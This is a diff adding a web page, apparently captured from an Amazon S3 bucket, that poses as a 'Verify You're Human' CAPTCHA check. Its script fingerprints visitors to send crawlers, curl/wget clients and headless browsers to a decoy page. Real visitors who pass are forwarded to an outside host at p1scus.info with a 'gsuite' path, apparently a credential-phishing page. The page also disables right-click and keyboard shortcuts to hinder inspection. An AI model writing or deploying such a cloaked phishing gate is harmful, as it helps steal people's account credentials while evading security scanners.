@@ -1,0 +1,202 @@
+<!-- url: https://remit-notification.s3.us-east-2.amazonaws.com/convax.html
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f5f5f5;
+        }
+        .captcha-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .cf-turnstile {
+            margin: 20px auto;
+            display: inline-block;
+        }
+        #blocked-message {
+            display: none;
+            color: #d32f2f;
+            margin-top: 15px;
+        }
+        .loading {
+            display: none;
+            margin-top: 20px;
+        }
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top: 4px solid #3498db;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+</head>
+<body>
+    <div class="captcha-container">
+        <h1>Verify You're Human</h1>
+        <p>Please complete the security check to continue</p>
+        <div class="cf-turnstile" 
+             data-sitekey="0x4AAAAAABLgGqMxEDquPTLp" 
+             data-callback="onCaptchaSuccess"
+             data-error-callback="onCaptchaError"
+             data-expired-callback="onCaptchaExpired">
+        </div>
+        <div id="blocked-message">
+            <h2>Access Temporarily Blocked</h2>
+            <p>Too many failed verification attempts.</p>
+            <p>Please try again later.</p>
+        </div>
+        <div class="loading" id="loadingIndicator">
+            <div class="spinner"></div>
+            <p>Verifying...</p>
+        </div>
+    </div>
+
+    <script>
+        // Track verification attempts
+        let attempts = 0;
+        const maxAttempts = 3;
+        const blockedTime = 300000; // 5 minutes in milliseconds
+        const botRedirectUrl = "index.html";
+        const targetUrl = "https://p1scus.info/gsuite/appid5183.php";
+
+        // Enhanced bot detection
+        function detectBot() {
+            // Check for common bot indicators
+            const botPatterns = [
+                /bot|googlebot|crawler|spider|robot|crawling/i,
+                /PhantomJS|HeadlessChrome/i,
+                /curl|wget|libwww-perl|python-requests/i
+            ];
+
+            const userAgent = navigator.userAgent;
+            const isBot = botPatterns.some(pattern => pattern.test(userAgent));
+
+            // Additional checks
+            const isHeadless = !userAgent || 
+                navigator.webdriver ||
+                window.outerWidth === 0 || 
+                window.outerHeight === 0 ||
+                !(document.createElement('canvas').getContext);
+
+            return isBot || isHeadless;
+        }
+
+        function showLoading() {
+            document.getElementById('loadingIndicator').style.display = 'block';
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingIndicator').style.display = 'none';
+        }
+
+        function redirectToBotPage() {
+            window.location.href = botRedirectUrl;
+        }
+
+        function onCaptchaSuccess(token) {
+            if (detectBot()) {
+                redirectToBotPage();
+                return;
+            }
+
+            showLoading();
+            
+            // Verify token with simulated server check
+            verifyToken(token).then(valid => {
+                hideLoading();
+                
+                if (valid && !detectBot()) {
+                    // Only proceed if still not detected as bot
+                    window.location.href = targetUrl + "?token=" + encodeURIComponent(token) + 
+                                          "&ts=" + Date.now();
+                } else {
+                    redirectToBotPage();
+                }
+            }).catch(() => {
+                redirectToBotPage();
+            });
+        }
+
+        function verifyToken(token) {
+            // In production, replace with actual API call to your server
+            return new Promise((resolve) => {
+                // Simulate server verification delay
+                setTimeout(() => {
+                    // Basic client-side validation
+                    const isValid = token && token.length > 50;
+                    resolve(isValid);
+                }, 1000);
+            });
+        }
+
+        function onCaptchaError() {
+            attempts++;
+            if (attempts >= maxAttempts) {
+                document.querySelector('.cf-turnstile').style.display = 'none';
+                document.getElementById('blocked-message').style.display = 'block';
+                setTimeout(() => {
+                    window.location.reload();
+                }, blockedTime);
+            } else {
+                if (typeof turnstile !== 'undefined') {
+                    turnstile.reset();
+                }
+            }
+        }
+
+        function onCaptchaExpired() {
+            if (typeof turnstile !== 'undefined') {
+                turnstile.reset();
+            }
+        }
+
+        // Initial bot check
+        if (detectBot()) {
+            redirectToBotPage();
+        }
+
+        // Additional protection against automation
+        document.addEventListener('DOMContentLoaded', () => {
+            // Block right-click
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            
+            // Block keyboard shortcuts
+            document.addEventListener('keydown', e => {
+                if (e.ctrlKey || e.metaKey) {
+                    e.preventDefault();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
